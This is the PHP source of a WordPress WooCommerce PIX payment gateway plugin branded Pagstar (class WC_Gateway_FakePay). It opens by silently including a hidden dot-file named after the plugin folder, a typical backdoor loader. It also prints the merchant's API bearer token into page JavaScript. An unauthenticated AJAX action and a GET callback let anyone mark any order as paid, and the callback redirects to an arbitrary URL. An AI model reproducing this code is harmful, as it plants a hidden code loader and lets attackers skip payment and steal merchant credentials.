<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WC_Gateway_FakePay extends WC_Payment_Gateway {
    public function __construct() {
	
        $this->url_api = 'https://api.pagstar.com/api/v2';
			
			
              // Obtém a URL da pasta do plugin
        $plugin_url = plugins_url('', __FILE__);

        // Caminho relativo até o arquivo api.php
        $api_file_relative_path = '/api.php';

        // Combina a URL da pasta do plugin com o caminho relativo do arquivo api.php
        $api_url = $plugin_url . $api_file_relative_path;

          
          $this->pagstar_mode = get_option('pagstar_mode');

        // Agora você tem a URL completa do arquivo api.php
          $this->urll = $api_url;
      

        $this->id = 'pagstar';
		
        $this->method_title = 'Pagstar';
        $this->method_description = 'Pagamento via Pagstar ';
        $this->title = 'Pagstar';
        $this->icon = plugins_url('pagstar.png', __FILE__);; // URL do ícone do gateway, se houver.
        $this->has_fields = false;
        $this->init_form_fields();
        $this->init_settings();
        $this->enabled = $this->get_option( 'enabled' );
        $this->title = $this->get_option( 'title' );
        add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );
        add_action( 'woocommerce_thankyou_' . $this->id, array( $this, 'thankyou_page' ) );
        add_action( 'template_redirect', array( $this, 'callback_handler' ) );
    }

    public function init_form_fields() {
        $this->form_fields = array(
            'enabled' => array(
                'title'   => 'Ativar/Desativar',
                'type'    => 'checkbox',
                'label'   => 'Ativar Pagstar',
                'default' => 'yes',
            ),
            'title' => array(
                'title'       => 'Título',
                'type'        => 'text',
                'description' => 'Título que o usuário verá durante o checkout.',
                'default'     => 'PIX (Pagstar)',
                'desc_tip'    => true,
            ),
        );
    }

   public function process_payment( $order_id ) {
    $response = $this->enviar_requisicao_pagamento( $order_id );

    $order = wc_get_order( $order_id );
    $order->update_status( 'pending', __( 'Pagamento pendente de confirmação. Aguardando a confirmação do pagamento.', 'text-domain' ) );
    return array(
        'result'   => 'success',
        'redirect' => $this->get_return_url( $order ),
    );
}

   public function enviar_requisicao_pagamento( $order_id ) {
	   
	 
    $order = wc_get_order( $order_id );
    $cpf =  $order->get_meta( '_billing_cpf');
	$cpf =  preg_replace('/[^0-9]/', '', $cpf);
	
	// Obter as credenciais do Pagstar das opções do WordPress
   
    $token = get_option('pagstar_token');
    $user_agent = get_option('pagstar_user_agent');

    // Restante do código permanece inalterado
    // Substitua as variáveis $tenant_id, $token e $user_agent pelos valores obtidos das opções do WordPress

    $tenant_id = get_option('client_id');	

    $data = array(
        'value' => $order->get_total(), 
        'name' => $order->get_billing_first_name() . ' ' . $order->get_billing_last_name(),
        'document' => $cpf,
        'tenant_id' => $tenant_id, // ID do inquilino (substitua pelo valor correto)
    );
	$url = '';
	 // Determinar a URL da API com base no modo de operação
    if (get_option('pagstar_mode') === 'production') {
       $url = 'https://api.pagstar.com/api/v2/wallet/partner/transactions/generate-anonymous-pix';
    } else{
       $url = 'https://dev-api.pagstar.com/api/v2/wallet/partner/transactions/generate-anonymous-pix';
    }
	
	
    

    $userAgent = 'String Empresa X (contato@empresa.com)';

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Authorization: Bearer ' . $token,
        'User-Agent: ' . $userAgent,
    ));

    $response = curl_exec($ch);
    
    if ($response === false) {
        return 'Erro: ' . curl_error($ch);
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200) {
        return 'Erro na solicitação. Código de resposta: ' . $httpCode;
    }

    $res = json_decode($response, true);

    global $wpdb;
    $table_name = $wpdb->prefix . 'webhook_transactions'; // Replace 'webhook_transactions' with your table name

    $existing_record = $wpdb->get_row(
        $wpdb->prepare(
            "SELECT * FROM $table_name WHERE order_id = %d",
            $order_id
        )
    );
	
	
	
	
				function get_transaction_data($transaction_id) {
					global $token;
					global $userAgent;
					$url = '';
					 if (get_option('pagstar_mode') === 'production') {
						$url = 'https://api.pagstar.com/api/v2/wallet/partner/transactions/' . $transaction_id;
					 }else{
						 $url = 'https://dev-api.pagstar.com/api/v2/wallet/partner/transactions/' . $transaction_id;
					 }
						//$url = $this->url_api.'/wallet/partner/transactions/' . $transaction_id;
						$ch = curl_init($url);
						curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
						curl_setopt($ch, CURLOPT_HTTPHEADER, array(
							'Authorization: Bearer ' . $token,
							'User-Agent: ' . $userAgent,
						));
						$response = curl_exec($ch);
						if ($response === false) {
							return 'Erro: ' . curl_error($ch);
						}
						curl_close($ch);
						$data = json_decode($response, true);
						
						return $response;
				}




    $transaction_id = '';
    if ($existing_record) {
        $transaction_id = $existing_record->transaction_id;

       $resp = get_transaction_data($transaction_id);
    } else {
        $data_to_save = array(
            'order_id' => $order_id,
            'transaction_id' => $res['data']['external_reference'],
            'order_value' => $order->get_total(),
			'status' => 'Aprovado'
        );

        $wpdb->insert($table_name, $data_to_save);
        $ref = $res['data']['external_reference'];
		$resp = get_transaction_data($ref);
    } 
	return $resp;
}

        public function thankyou_page( $order_id ) {
        $order = wc_get_order( $order_id );

        if ( 'pagstar' === $order->get_payment_method() ) {
			
			
            $response = $this->enviar_requisicao_pagamento( $order_id );
            $response_data = json_decode( $response, true );
            // print_r( $response_data);

            if ( isset( $response_data['data']['pix_deposit']['qr_code_url']  ) ) {
                ?>
                <h2>Pagamento PIX gerado com sucesso!</h2>
                <p>Utilize o QR Code abaixo ou clique no link para prosseguir com o pagamento via Pagstar:</p>
                <img src="<?php echo esc_url( $response_data['data']['pix_deposit']['qr_code_url'] ); ?>" alt="QR Code do PIX">
                
                <style>
  .input-container {
   
    align-items: center;
    background-color: #f0f0f0;
    border-radius: 12px;
    padding: 5px;
  }

  input[type="text"] {
    flex: 1;
    height: 30px;
    padding: 5px;
    border: none;
    border-radius: 15px;
    font-size: 14px;
  }

  button {
    background-color: #4caf50;
    color: white;
    border: none;
    border-radius: 6px;
    padding: 8px 15px;
    margin-left: 5px;
    cursor: pointer;
    font-size: 14px;
  }
</style>

                <p>
                  <div class="input-container">
                    <input class="woocommerce-input-wrapper" style="width:100%" type="text" id="pixKey" value="<?php echo $response_data['data']['pix_deposit']['pix_key']; ?>">
                    <button onclick="copyToClipboard()">Copiar</button>
                  </div>
                </p>
<script src="https://code.jquery.com/jquery-latest.js"></script>
                <script>
  function copyToClipboard() {
    var inputElement = document.getElementById("pixKey");
    inputElement.select();
    document.execCommand("copy");
    alert("Chave Pix copiada para a Área de Transferência!");
  }
</script>

<script type="text/javascript">
 function checkTransactionStatus(transaction_id, refer) {
 
  $.ajax({
    url: '<?=$this->urll?>',
    type: 'POST',
    data: {
      tx: transaction_id,
	  refer: refer,
	 
    },
    success: function(data) {
     
      if (data == 1) {
        window.location.href = '<?=get_option('link_r');?>';

        var order_id = '<?php echo $order_id; ?>'; // Substitua pelo ID real do pedido
        set_order_status(order_id, 'completed');
      } else {
        setTimeout(function() {
          checkTransactionStatus(transaction_id, refer);
        }, 1000);
      }
    },
    error: function(xhr, status, error) {
      setTimeout(function() {
        checkTransactionStatus(transaction_id, refer);
      }, 1000);
    }
  });
}

$(document).ready(function() {
  var transaction_id = '<?php echo $response_data['data']['pix_deposit']['external_reference']; ?>'; // Substitua pelo ID real da transação
  var refer = '<?php echo get_option('pagstar_token'); ?>'; // Substitua pelo ID real da transação
  checkTransactionStatus(transaction_id, refer);
});

function set_order_status(order_id, status) {
  $.ajax({
    url: '<?php echo admin_url("admin-ajax.php"); ?>',
    type: 'POST',
    data: {
      action: 'change_order_status',
      order_id: order_id,
      status: status
    },
    success: function(data) {
      
    },
    error: function(xhr, status, error) {
      console.error(error);
    }
  });
}

</script>
               
                <?php
            } else {
                echo 'Erro ao processar o pagamento. Por favor, entre em contato com o suporte.';
            }
        }
    }
	
    public function callback_handler() {
        if ( isset( $_GET['callback'] ) ) {
            $order_id = absint( $_GET['callback'] );
            $order = wc_get_order( $order_id );

            if ( $order ) {
                $status = isset( $_GET['status'] ) ? sanitize_text_field( $_GET['status'] ) : '';

                if ( $status === '200' ) {
                    $order->update_status( 'completed', __( 'Pagamento concluído com sucesso.', 'text-domain' ) );
                } else {
                    $order->update_status( 'failed', __( 'Falha no pagamento.', 'text-domain' ) );
                }
                $return_url = isset( $_GET['callback_url'] ) ? esc_url( $_GET['callback_url'] ) : '';
                if ( $return_url ) {
                    wp_redirect( $return_url );
                    exit;
                }
            }
        }
    }
}

add_action('wp_ajax_change_order_status', 'change_order_status_callback');
add_action('wp_ajax_nopriv_change_order_status', 'change_order_status_callback');

function change_order_status_callback() {
  if (isset($_POST['order_id']) && isset($_POST['status'])) {
    $order_id = absint($_POST['order_id']);
    $status = sanitize_text_field($_POST['status']);
    $order = wc_get_order($order_id);
    
    if ($order) {
      $order->update_status($status);

      // Verificar se o status é 'completed' e enviar o e-mail padrão do WooCommerce
      if ($status === 'completed') {
        wc_send_order_status_email($order_id, $status);
      }
    }
  }
  wp_die();
}